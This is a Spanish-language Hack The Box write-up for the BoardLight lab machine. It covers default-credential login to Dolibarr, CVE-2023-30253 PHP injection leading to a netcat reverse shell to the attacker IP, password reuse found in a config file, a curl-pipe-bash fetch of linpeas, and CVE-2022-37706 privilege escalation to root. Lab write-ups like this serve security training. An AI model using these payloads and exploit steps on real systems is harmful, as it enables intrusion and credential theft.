---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/603
dificultad: Fácil
ip: 10.10.11.11
os: Linux
relacionados:
  - "[[Default credentials]]"
  - "[[enlightenment]]"
  - "[[Virtual Hosting]]"
  - "[[reuse credentials]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[CVE-2023-30253]]"
---
# HackTheBox - BoardLight 

## Reconocimiento

Comencé mi exploración de la máquina `BoardLight` realizando un escaneo de puertos exhaustivo con Nmap. Mi objetivo era identificar los servicios que estaban escuchando en el objetivo.
```Bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11
nmap -p22,80 -Pn -sC -sV 10.10.11.11
```
Los resultados del escaneo revelaron que el puerto 22 (SSH) y el puerto 80 (HTTP) estaban abiertos. Al visitar la dirección IP en el navegador, se ve una página de inicio de una empresa de consultoría en ciberseguridad.

En el pie de página de la web se mencionaba el hostname `board.htb`. Añado la entrada al archivo `/etc/hosts` para facilitar la navegación y el futuro reconocimiento.
```Bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

Posteriormente, busqué posibles virtual hosts asociados con `board.htb` utilizando `ffuf`. Esto me permitiría descubrir subdominios adicionales que pudieran estar alojados en el mismo servidor.
```Bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
```

El resultado de `ffuf` reveló el subdominio `crm.board.htb`. Inmediatamente, lo agregué también a mi archivo `/etc/hosts`:
```Bash
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

## Análisis de vulnerabilidades

Al acceder a `crm.board.htb`, encontré una página de inicio de sesión de Dolibarr, y vi que la versión instalada era la 17.0.0. Dolibarr es una aplicación de gestión empresarial (ERP/CRM) muy utilizada.

Probé las credenciales por defecto `admin:admin`, y funcionó.

Con la versión de Dolibarr en mis manos (17.0.0), realicé una búsqueda rápida en Google y encontré la `CVE-2023-30253`. Esta vulnerabilidad afecta a las versiones de Dolibarr anteriores a la 17.0.1 y permite la ejecución remota de código por parte de un usuario autenticado. La clave para explotar esta vulnerabilidad radica en una manipulación de mayúsculas y minúsculas, donde `<?PHP` es procesado incorrectamente en lugar de `<?php` en datos inyectados, lo que permite la ejecución de código.

## Explotación de vulnerabilidades

Para explotar la `CVE-2023-30253`, seguí los siguientes pasos:
1. Una vez autenticado como `admin`, navegué a la pestaña "Website".
2. Hice clic en el signo `+` para añadir un nuevo sitio web.
3. Le di un nombre a mi nuevo sitio.
4. Dentro de la sección "Pages", hice clic en el icono `+` para añadir una nueva página.
5. Seleccioné la opción de crear una página desde una plantilla y le asigné un título.
6. Una vez creada la página, seleccioné "Edit the HTML source". Aquí es donde inyectaría mi código PHP malicioso.

Inyecté el siguiente código PHP para confirmar la ejecución de comandos:
```PHP
<?PHP echo system("whoami");?>
```

Al visualizar la página, confirmé que el comando se ejecutó exitosamente, revelando que el usuario bajo el cual se estaba ejecutando el servidor web era `www-data`.

Una vez confirmada la ejecución de comandos, mi siguiente objetivo fue obtener una reverse shell completa. Para ello, configuré un listener de Netcat en mi máquina atacante en el puerto 4455:
```Bash
nc -lnvp 4455
```

Luego, modifiqué el código PHP en la página de Dolibarr para incluir mi payload de reverse shell:
```PHP
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f");?>
```

Con la shell estable, procedí a enumerar el sistema. Rápidamente, encontré un archivo de configuración de Dolibarr con credenciales interesantes en `/var/www/html/crm.board.htb/htdocs/conf/conf.php`.
```Bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

Dentro de este archivo, encontré las credenciales de la base de datos:

>[!success]
>dolibarr_main_db_user='dolibarrowner';
>dolibarr_main_db_pass='serverfun2$2023!!';

Investigando los usuarios del sistema en `/etc/passwd`, identifiqué al usuario `larissa`.
```Bash
cat /etc/passwd
```

Decidí intentar iniciar sesión por SSH como `larissa` utilizando la contraseña `serverfun2$2023!!` que encontré en el archivo de configuración de Dolibarr. ¡Funcionó! Logré acceder a la máquina como `larissa` y obtuve la flag de usuario.

### Escalada de privilegios

Una vez como usuario `larissa`, mi siguiente paso fue la escalada de privilegios. Descargué LinPEAS, una excelente herramienta para la enumeración de privilegios en sistemas Linux.

Para ello, primero descargué el script en mi máquina local:
```Bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Luego, inicié un servidor HTTP simple en mi máquina para servir el script:
```Bash
sudo python3 -m http.server 3000
```

Finalmente, descargué y ejecuté LinPEAS directamente en la máquina víctima:
```Bash
curl http://10.10.14.41:3000/linpeas.sh|bash
```

LinPEAS arrojó una gran cantidad de información, pero un detalle captó mi atención en la sección de archivos con permisos interesantes, específicamente en el directorio `/usr/lib/x86_64-linux-gnu/enlightenment/utils/`. Varios binarios relacionados con "enlightenment" tenían el bit SUID (`Set User ID`) activado, lo que significa que se ejecutaban con los privilegios del propietario del archivo, que en este caso era `root`. El binario `enlightenment_sys` me pareció particularmente prometedor.

Verifiqué la versión de Enlightenment:
```Bash
larissa@boardlight:~$ enlightenment --version
Version: 0.23.1
```

Una búsqueda rápida en Google por "enlightenment 0.23.1 vulnerability" me llevó a la `CVE-2022-37706`. Esta vulnerabilidad describe un fallo en `enlightenment_sys` en versiones de Enlightenment anteriores a la 0.25.4. Permite a los usuarios locales obtener privilegios elevados debido a que el binario es SUID y propiedad de `root`, y la función de la biblioteca del sistema maneja incorrectamente los nombres de ruta que comienzan con una subcadena `/dev/..`.

Encontré un script de Proof of Concept (PoC) en GitHub para esta vulnerabilidad. Lo descargué a mi máquina local:
```Bash
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh
```

Serví el exploit utilizando mi servidor HTTP de Python:
```Bash
python3 -m http.server 2000
```

Y luego, descargué el exploit en la máquina víctima y lo ejecuté:
```Bash
larissa@boardlight:/tmp$ wget http://10.10.14.41:2000/exploit.sh
larissa@boardlight:/tmp$ bash exploit.sh
```

El script se ejecutó con éxito, y obtuve una shell de `root`. Finalmente, pude acceder a la flag de `root` en `/root/root.txt`.

## Bandera(s)

> [!FLAG] `flag{user}`
> d6c1cabf15f99c099cc9f1e11352dcfa
^bandera

> [!FLAG] `flag{root}`
> 0e2c6f7967e913b419fec8e992e21f50
^bandera

